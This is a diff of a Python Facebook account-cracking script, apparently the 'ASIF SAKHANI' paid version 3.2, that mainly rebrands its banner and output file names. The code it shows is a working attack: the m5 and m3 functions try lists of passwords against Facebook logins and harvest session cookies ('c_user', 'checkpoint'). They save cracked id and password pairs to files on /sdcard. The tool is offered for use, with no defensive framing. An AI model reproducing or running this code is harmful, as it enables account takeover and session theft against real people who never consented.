@@ -166,19 +166,18 @@ def clear():
 def banner():
     #os.system('clear')
     print("""\033[38;5;48m
- 
-           _____ _____ ______ 
+  
+            _____ _____ ______ 
      /\    / ____|_   _|  ____|
     /  \  | (___   | | | |__   
    / /\ \  \___ \  | | |  __|  
   / ____ \ ____) |_| |_| |     
  /_/    \_\_____/|_____|_|     
-                            
-      \033[1;91m<\033[1;41m\033[1;97m ASIF SAKHANI \033[;0m\033[1;91m>\033[1;92m                                            
+      \033[1;91m<\033[1;41m\033[1;97m ASIF SAKHANI 03417020930\033[;0m\033[1;91m>\033[1;92m                                            
 \033[1;32m
 \033[3;30m\033[2;37mPa\033[2;31mid \033[2;37mVers\033[2;36mi\033[2;37mon \033[2;34m3.2\x1b[0m
-\033[38;5;96m\033[47m  \x1b[0m\033[38;5;196m Owner   :  ASIF SAKHANI 
-\033[38;5;97m\033[47m  \x1b[0m\033[38;5;197m Whatsapp      : 03417020930
+\033[38;5;96m\033[47m  \x1b[0m\033[38;5;196m DEVELOPER   :   ASIF SAKHANI 
+\033[38;5;97m\033[47m  \x1b[0m\033[38;5;197m WHATSAPP   :   03417020930
 \033[38;5;98m\033[47m  \x1b[0m\033[38;5;198m POWER BY    :   ASIF SAKHANI\033[1;30m
 \033[1;32m""")
 
@@ -242,11 +241,11 @@ def mainx():
     elif mahin in ["7","07"]:
      os.system("xdg-open https://github.com/41v1-thcf-alvi");mainx()
     elif mahin in ["3","03"]:
-     os.system("xdg-open https://www.facebook.com/profile.php?id=100063307807505&mibextid=ZbWKwL");mainx()
+     os.system("xdg-open https://www.facebook.com/profile.php?id=100063307807505");mainx()
     elif mahin in ["0","00"]:
-     print(f'{gen}{RED}Exited {H}ASIF-SAKHANI {P}Terminal ');os.system("https://www.facebook.com/profile.php?id=100063307807505&mibextid=ZbWKwL");time.sleep(3);os.system('xdg-open https://www.facebook.com/groups/fb.PARVEZ.cyber/?ref=share');exit()
+     print(f'{gen}{RED}Exited {H}FB-Baba jutt {P}Terminal ');os.system("xdg-open https://www.facebook.com/profile.php?id=100063307807505");time.sleep(3);os.system('xdg-open https://www.facebook.com/groups/fb.PARVEZ.cyber/?ref=share');exit()
     else:
-     print(f"{dot}{M}Don't Select Wrong Options ");os.system("xdg-open https://www.facebook.com/profile.php?id=100063307807505&mibextid=ZbWKwL");mainx()
+     print(f"{dot}{M}Don't Select Wrong Options ");os.system("xdg-open https://www.facebook.com/profile.php?id=100063307807505");mainx()
 def mainx2():
     os.system("clear")
     banner()
@@ -269,11 +268,11 @@ def mainx2():
     elif mahin in ["0","00"]:
      mainx()
     else:
-        print(f"{dot}{M}Don't Select Wrong Options ");os.system("xdg-open https://www.facebook.com/profile.php?id=100063307807505&mibextid=ZbWKwL");mainx()
+        print(f"{dot}{M}Don't Select Wrong Options ");os.system("xdg-open https://www.facebook.com/profile.php?id=100063307807505");mainx()
 #SAWYA
 # FILE CRACK -- MAIN DEF #
 def cr():
-            os.system('clear');banner();print(f'{dot}EXAMPLE :  /sdcard/ASIF SAKHANI.txt{P}{H}{P} ');time.sleep(0.05);linex3()
+            os.system('clear');banner();print(f'{dot}EXAMPLE :  /sdcard/ASIF.txt{P}{H}{P} ');time.sleep(0.05);linex3()
             try:
                 fileX = input(f"{wt}YOUR FILE NAME {RED}:{H} ")
                 for line in open(fileX, 'r').readlines():
@@ -380,8 +379,8 @@ def x7():
 
 def m5(idf,pwv):
     global loop, ok, cp
-    animasi = random.choice(["\33[1;32mASIF-SAKHANI","\33[1;32mASIF-SAKHANI","\33[1;32Baba jutt","\33[1;32mBaba jutt","\33[1;32mBaba jutt","\33[1;32mBaba jutt","\33[1;32mBaba jutt","\33[1;32mBaba jutt","\33[1;32mBaba jutt","\33[1;32mBaba jutt","\33[1;32mBaba jutt","\33[1;32mBaba jutt","\33[1;32mBaba jutt"])
-    sys.stdout.write(f'\r{P}[{ASIF}{H}{P}] [{B}%s{P}]{U}- {H}OK{P}[{GREEN}%s{P}]'%(loop,ok)),
+    animasi = random.choice(["\33[1;32mASIF","\33[1;32mASIF","\33[1;32mASIF","\33[1;32mASIF","\33[1;32mASIF","\33[1;32mASIF","\33[1;32mASIF","\33[1;32mASIF","\33[1;32mASIF","\33[1;32mASIF","\33[1;32mASIF","\33[1;32mAsIF","\33[1;32mASIF"])
+    sys.stdout.write(f'\r{P}[{animasi}{H}{P}] [{B}%s{P}]{U}- {H}OK{P}[{GREEN}%s{P}]'%(loop,ok)),
     sys.stdout.flush()
     az = "A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"
     rr = random.randint
@@ -420,18 +419,18 @@ def m5(idf,pwv):
              idf = session.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
              cp+=1
              if 'y' in cp_xdx:
-              print(f'\r{P}[\033[1;28ASIF-SAKHANI{P}] \033[1;28m{idf} • {pw}{xxx}')
-             open(' /sdcard/ASIF-SAKHANI-CP.txt', 'a').write(idf+'|'+pw)
+              print(f'\r{P}[\033[1;28ASIF{P}] \033[1;28m{idf} • {pw}{xxx}')
+             open(' /sdcard/ASIF-CP.txt', 'a').write(idf+'|'+pw)
              cp.append(idf)
              break
             elif "c_user" in session.cookies.get_dict().keys():
                 kukis = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                 idf = re.findall('c_user=(.*);xs', kukis)[0]
                 ok+=1
-                print(f'\r{P}[{H}ASIF-SAKHANI-OK{P}] {GREEN}{idf} • {pw}{xxx}');linex3()
+                print(f'\r{P}[{H}ASIF-OK{P}] {GREEN}{idf} • {pw}{xxx}');linex3()
                 if 'y' in cokix:
                  print(f'\r\33[1;92m[COOKIES] = {H}'+kukis);linex3()
-                open(' /sdcard/ASIF-SAKHANI-OK.txt', 'a').write(idf+'|'+pw)
+                open(' /sdcard/ASIF-OK.txt', 'a').write(idf+'|'+pw)
                 ok.append(idf+'|'+pw)
                 break
             else:
@@ -450,8 +449,8 @@ def m3(idf,pw):
  global loop
  global ok
  global agents
- animasi = random.choice(["\33[1;32mASIF-SAKHANI","\33[1;32mBaba jutt","\33[1;32mBaba jutt","\33[1;32mBaba jutt","\33[1;32mBaba jutt","\33[1;32mBaba jutt","\33[1;32mBaba jutt","\33[1;32mBaba jutt","\33[1;32mBaba jutt","\33[1;32mBaba jutt","\33[1;32mBaba jutt","\33[1;32mBaba jutt","\33[1;32mBaba jutt"])
- sys.stdout.write(f'\r{P}[{ASIF}{H}{P}] [{B}%s{P}]{U}- -{H}OK{P}[{GREEN}%s{P}]'%(loop,ok)),
+ animasi = random.choice(["\33[1;32mASIF","\33[1;32mBaba jutt","\33[1;32mBaba jutt","\33[1;32mBaba jutt","\33[1;32mBaba jutt","\33[1;32mBaba jutt","\33[1;32mBaba jutt","\33[1;32mBaba jutt","\33[1;32mBaba jutt","\33[1;32mBaba jutt","\33[1;32mBaba jutt","\33[1;32mBaba jutt","\33[1;32mBaba jutt"])
+ sys.stdout.write(f'\r{P}[{animasi}{H}{P}] [{B}%s{P}]{U}- -{H}OK{P}[{GREEN}%s{P}]'%(loop,ok)),
  try:
   for ps in pw:
    session = requests.Session()
@@ -493,12 +492,12 @@ def m3(idf,pw):
    if 'c_user' in log_cookies:
     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
     user = re.findall('c_user=(.*);xs', coki)[0]
-    print('\r\033[1;32m[ASIF-SAKHANI-OK] '+user+' • '+ps)
+    print('\r\033[1;32m[ASIF-OK] '+user+' • '+ps)
     if 'y' in cokix:
      print(f'\33[1;92m[COOKIES] = {H}'+coki)
      linex3()
     ok+=1 
-    open(' /sdcard/ASIF-SAKHANI-OK.txt','a').write(user+'|'+ps+'|'+'\n')
+    open(' /sdcard/ASIF-OK.txt','a').write(user+'|'+ps+'|'+'\n')
     ok.append(user)
     break
    elif 'checkpoint' in log_cookies:
@@ -506,8 +505,8 @@ def m3(idf,pw):
     coki1 = coki.split("1000")[1]
     uid = "1000"+coki1[0:11]
     if 'y' in cp_xdx:
-     print(f'\r{P}[\033[1;30mASIF-SAKHANI-CP{P}] \033[1;30m{idf} • {ps}{xxx}')
-    open(' /sdcard/ASIF-SAKHANI-CP.txt','a').write(idf+'|'+ps+'|'+'\n')
+     print(f'\r{P}[\033[1;30mASIF-CP{P}] \033[1;30m{idf} • {ps}{xxx}')
+    open(' /sdcard/ASIF-CP.txt','a').write(idf+'|'+ps+'|'+'\n')
     cp.append(idf)
    else:
     continue
